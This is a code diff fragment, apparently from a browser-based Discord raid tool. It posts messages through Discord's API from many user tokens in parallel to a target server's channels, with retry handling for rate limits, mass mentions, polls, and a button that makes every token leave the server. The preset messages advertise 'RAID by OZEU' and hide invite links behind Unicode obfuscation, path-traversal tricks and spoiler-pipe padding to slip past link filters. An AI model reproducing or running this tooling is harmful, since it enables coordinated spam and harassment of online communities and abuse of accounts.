+    if (opts.pollTitle && opts.pollAnswers) body.poll = { question: { text: opts.pollTitle }, answers: opts.pollAnswers.map(a => ({ poll_media: { text: a.trim() } })), allow_multiselect: false, duration: 1, layout_type: 1 };
+  
+    const res = await fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, { method: 'POST', headers, body: JSON.stringify(body), referrerPolicy: "no-referrer" });
+    return res;  // レスポンスを返す
+}
+
+// 再試行ロジックを外で実行
+async function sendMessageWithRetry(token, channelId, content, opts = {}, maxRetries = 5, delayTime = 3000) {
+    let attempt = 0;
+    while (attempt < maxRetries) {
+        try {
+            const res = await sendMessage(token, channelId, content, opts);
+            if (res.ok) {
+                appendLog(`✅ ${token.slice(0, 10)}***** - メッセージ送信成功`);
+                return true;
+            } else if (res.status === 429) {
+                const jd = await res.json();
+                const wait = (jd?.retry_after || 1) * 1000;
+                appendLog(`⏳  ${token.slice(0, 10)}***** - レート制限: ${wait / 1000}s`);
+                await sleep(wait);
+                attempt++;
+            } else if (res.status === 400) {
+              const errorData = await res.json();
+              appendLog(`❌ ${token.slice(0, 10)}***** - 送信エラー(${res.status}): ${JSON.stringify(errorData) || '詳細不明'}`);
+              authtest = await authenticateOnly(token);
+              if (!authtest) return false;
+            } else {
+                const errorData = await res.json();
+                appendLog(`❌ ${token.slice(0, 10)}***** - 送信エラー(${res.status}): ${JSON.stringify(errorData) || '詳細不明'}`);
+                return false;
+            }
+        } catch (e) {
+            appendLog(`⚠️ ${token.slice(0, 10)}***** - エラー: ${e.message} | 再試行中...`);
+            await sleep(delayTime);
+            attempt++;
+        }
+    }
+    appendLog(`❌ トークン(${token.slice(0, 10)}) 最大リトライ回数に達しました。`);
+    return false;
+}
+
+// 入力が未入力の場合、ボタンを無効化
+function checkFormValidity() {
+  const tokens = tokensInput.value.trim();
+  const guildId = guildInput.value.trim();
+  //const message = messageInput.value.trim();
+  submitBtn.disabled = !(tokens && guildId);
+}
+
+// 入力フィールドの変更時にチェック
+tokensInput.addEventListener('input', checkFormValidity);
+guildInput.addEventListener('input', checkFormValidity);
+//messageInput.addEventListener('input', checkFormValidity);
+
+// 初期状態でフォームの有効性をチェック
+checkFormValidity();
+
+// スパム実行
+form.addEventListener('submit', async e => {
+    e.preventDefault();
+    const messageInput      = document.querySelector('input[name="messageOption"]:checked');
+    // メッセージがAの場合
+    let message;
+    if (messageInput.value === 'A') {
+        message = `# RAID by OZEU. join now
+# ozeu on top
+https://discord.gg/ozetudo
+https://discord.gg/ozetudo-x`
+    }
+    else if (messageInput.value === 'B') {
+        message = `# おぜうの集いに今すぐ参加！
+## https://\/\/\ｃ͏a͏ｎ͏a͏ｒ͏ｙ͏。͏𝑑͏𝓲͏Ｓ͏𝐜͏𝑜͏ｒ͏ᵈ͏Ａ͏pＰ͏。͏𝐜͏𝑜͏ｍ͏\google.com⁂⌘∮/%2e.\../%69%6e%76%69%74%65\youtube.com‖∠∇\../\../\../white_check_marktwitter.com]「＠\../\../\../\../hK5He8z8Ge
+-# [gif](https://𝕚͏𝕞͏𝕘͏𝕦͏𝕣͏.͏𝕔͏𝕠͏𝕞͏/yNx4Me2)
+-# [gif](https://𝗺͏𝗲͏𝗱͏𝗶͏𝗮͏.͏𝗱͏𝗶͏𝘀͏𝗰͏𝗼͏𝗿͏𝗱͏𝗮͏𝗽͏𝗽͏.͏𝗻͏𝗲͏𝘁͏/attachments/1341829977850646668/1353001058405978172/IMB_DZBN6p.gif?ex=67e00fed&is=67debe6d&hm=b07d1cf915c35fa1871b655f91d3738eba09ea05683a1abf5b883b0598f3b92a&)
+-# [gif](https://𝕚͏𝕞͏𝕘͏𝕦͏𝕣͏.͏𝕔͏𝕠͏𝕞͏/NbBGFcf.mp4)
+|| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| |||| ||`
+    }
+    else if (messageInput.value === 'C') {
+        message = `https://x.gd/fpRON`
+    }
+    if (!message) {
+        appendLog('⚠️ メッセージ内容が入力されていません');
+        return;  // 処理を終了
+    }
+
+    submitBtn.disabled = true;
+    submitBtn.classList.add('loading');
+    submitBtn.textContent = '実行中...';
+    shouldStopSpam = false;
+    stopBtn.disabled = false;
+  
+    const tokens      = parseList(tokensInput.value);
+    const guildId     = guildInput.value.trim();
+    const channelIds  = parseList(channelInput.value);
+    const randomize   = randomizeCheckbox.checked;
+    const allmention  = allmentionCheckbox.checked;
+    const delay       = parseFloat(delayInput.value) || 0;
+    const limit       = limitInput.value.trim() ? parseInt(limitInput.value) : Infinity;
+    const mentionArr  = mentionInput.value.trim() ? parseList(mentionInput.value) : null;
+    const pollTitle   = pollTitleInput.value.trim() || null;
+    const pollAnswers = pollAnswersInput.value.trim() ? parseList(pollAnswersInput.value) : null;
+  
+    let totalCount = 0;
+  
+    // トークンごとにメッセージ送信タスクを実行
+    const tasks = tokens.map(token => {
+      return async () => {
+        let channelIndex = 0;
+        
+        // トークンごとに、メッセージ送信を続ける
+        while (!shouldStopSpam && totalCount < limit) {
+          // チャンネルの数が限られているので、全てのチャンネルに送信後ループを抜けないように
+          if (channelIndex >= channelIds.length) {
+            channelIndex = 0; // チャンネルを最初から再送信する
+          }
+          
+          const channelId = channelIds[channelIndex];
+          channelIndex++; // 次のチャンネルへ
+          
+          const success = await sendMessageWithRetry(token, channelId, message, { randomize, randomMentions: mentionArr, pollTitle, pollAnswers, allmention });
+          
+          if (success) totalCount++;  // 送信成功時にカウントを増加
+          if (totalCount >= limit) {
+            appendLog('✅ 指定数に達しました');
+            break;  // 指定回数に達したら終了
+          }
+  
+          if (delay) { 
+            //appendLog(`⏱ ディレイ ${delay}秒`); 
+            await sleep(delay * 1000); 
+          }
+        }
+      };
+    });
+  
+    // 各トークンについて並列でタスクを実行
+    await Promise.all(tasks.map(task => task()));
+  
+    submitBtn.disabled = false;
+    submitBtn.classList.remove('loading');
+    stopBtn.disabled = true;
+    submitBtn.textContent = '実行';
+    appendLog('✅ 完了');
+});
+
+
+// 停止ボタンリスナー
+stopBtn.addEventListener('click', () => {
+  shouldStopSpam = true;
+  appendLog('🛑 スパムを停止します...')
+  submitBtn.disabled = false; submitBtn.classList.remove('loading') ; submitBtn.textContent = '実行';
+});
+
+// 退出ボタンリスナー
+leaveBtn.addEventListener('click', async () => {
+  shouldStopSpam = true; stopBtn.disabled = true; appendLog('🛑 スパムを停止します...');
+  const tokens  = parseList(tokensInput.value);
+  const guildId = guildInput.value.trim();
+  if (!tokens.length) return appendLog('⚠️ トークンを入力してください');
+  if (!guildId) return appendLog('⚠️ サーバーIDを入力してください');
+  for (const token of tokens) await leaveGuild(token, guildId);
+  appendLog('✅ 退出処理完了');
+  submitBtn.disabled = false; submitBtn.classList.remove('loading') ; submitBtn.textContent = '実行';
+});
